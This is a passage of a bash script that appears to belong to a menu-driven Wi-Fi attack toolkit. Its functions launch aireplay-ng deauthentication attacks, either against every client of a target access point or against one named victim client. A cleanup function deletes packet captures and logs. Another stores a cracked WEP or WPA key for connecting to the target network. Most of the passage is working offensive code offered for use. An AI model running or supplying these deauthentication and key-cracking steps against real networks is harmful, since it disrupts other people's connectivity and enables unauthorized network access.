	elif [ "$Q" = "y" ]; then
		echo
		echo "---> Setting frequency..."
		ifconfig $INT down
		iwconfig $INT channel $TCH
		ifconfig $INT up
		echo "---> Initalizing Mass De-Auth Attack Against $TESSID..."
		konsole --vt_sz 88x15 --caption "DeAuthenticating $TESSID" -e aireplay-ng -0 0 -a $TBSSID $INT &
		sleep 1
		echo "---> DeAuth in Progress!"
		echo
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	else
		echo "Invalid Selection!"
		sleep 1
			AP-DeAuth
	fi
}

					# End Access Point Mass De-Authentication Function--->

					# <---Start Client Specific De-Authentication Function

function CL-DeAuth {
clear
cat ./headers/cldeauthheader
cat ./headers/line1
	if [ "$VICBSSID" = "$(cat /dev/null)" ]; then
		echo
		echo "---> No Victim Currently Set!"
		echo "---> Please Set One!"
		echo
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	else
        	echo
        	echo " ---> Current Target <---"
        	echo "ESSID: $TESSID"
        	echo "BSSID: $TBSSID"
        	echo "Channel: $TCH"
		echo "Victim: $VICBSSID"
        	echo
        	echo "---> Would you like to use this Target?"
        	read Q
		if [ "$Q" = "n" ]; then
			echo
			echo "---> Please Set New Target!"
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$Q" = "y" ]; then
			echo
			echo "---> Setting Frequency..."
			ifconfig ath0 down
			iwconfig ath0 channel $TCH
			ifconfig ath0 up
			echo "---> Initalizing Client Specific DeAuthentication Attack..."
			konsole --vt_sz 88x15 --caption "DeAuthenticating Client..." -e aireplay-ng -0 0 -a $TBSSID -c $VICBSSID $INT &
			sleep 1
			echo "---> DeAuthentication Attacking Running!"
			echo 
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		else
			echo "Invalid Selection!"
			sleep 1
				CL-DeAuth
		fi
	fi
}

					# End Client Specific De-Authentication Function--->

					# <---Start AV Clean-up Function

function Clean {
clear
cat ./headers/cleanheader
cat ./headers/line1
	echo
	echo "---> Initalizing Clean..."
#	echo "$(ls ./tmp)" > ./config/tmplist.cfg
	rm -rf ./tmp/*
	rm ./*.cap 2> /dev/null
	rm ./*.services 2> /dev/null
	rm ./*.log 2> /dev/null
	export VARS1="TENCP TBSSID TESSID TENC VICBSSID TENCCODE CENCCODE TCH TENC TCHIPHER CBSSID CESSID CChannel CKey CCIPHER LOG DESTROYALL GPSSTATE PMKPARENT PARENT ACTIVEDATABASE CURRENTIP DBSTAT"
	for DATA in $VARS1; do
		export $DATA=""
	done
#	for FILES in $(cat ./config/tmplist.cfg); do
#		echo "$(cat /dev/null)" > ./tmp/$FILES
#	done
	echo "---> Clean Complete!"
	sleep 2
	echo "---> Returning to Main Menu..."
	sleep 1
		Main-Menu
}

                                        # End AV Clean-up Function --->

					# <---Start Encryption Code Entry Function

function entercode {
	echo
	echo "---> Would you like to Enter the Cracked Encryption Code?"
	read Q
	if [ "$Q" = "n" ]; then
		echo
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	elif [ "$Q" = "y" ]; then
		echo
		echo "---> Please Enter Code <---"
		echo "---------------------------"
		read ENC
		echo "---------------------------"
		echo
		echo "$ENC" > ./tmp/targetenccode
		echo "$ENC" > ./tmp/connecttargetKey
		echo "---> Determining Encryption Type..."
		sleep 1
		TYPE=$(cat ./tmp/targetenccode |grep :)
		if [ "$TYPE" = "$(cat /dev/null)" ]; then
			echo "---> WPA Key Detected!"
			TYPE=WPA
			sleep 1
		else
			echo "---> WEP Key Detected!"
			TYPE=WEP
			sleep 1
		fi
		if [ "$TYPE" = "WPA" ]; then
			echo "---> Storing Encryption Code..."
			export TENCCODE=$ENC
			sleep 1
			echo "---> Code Stored!"
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$TYPE" = "WEP" ]; then
			echo "---> Determining Cipher Strength..."
			LENGTH=$(cat ./tmp/targetenccode |wc -m)
			if [ "$LENGTH" = "10" ]; then
				echo "---> 64bit Cipher!"
				echo "---> Storing Encryption Code..."
				sleep 1
				echo "---> Code Stored!"
				sleep 2
			elif [ "$LENGTH" = "15" ]; then
				echo "---> 64bit Cipher!"
				echo "---> Storing Encryption Code..."
				sleep 1
				echo "---> Encryption Stored!"
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			elif [ "$LENGTH" = "26" ]; then
				echo "---> 128bit Cipher!"
				echo "---> Storing Encryption Code..."
				sleep 1
				echo "---> Code Stored!"
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			elif [ "$LENGTH" = "39" ]; then
				echo "---> 128bit Cipher!"
				echo "---> Storing Encryption Code..."
				sleep 1
				echo "---> Encryption Stored!"
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			else
				echo "---> Irregular Encryption Code Length!"
				echo "---> Please Check Code Entered!"
			fi
		else
			echo "---> ERROR!"
			echo "---> Please Check Entered Encryption Code!"
		fi
	else
		echo "Invalid Selection!"
		sleep 1
			entercode
	fi
}

					# End Encryption Code Entry Function--->
Main-Menu
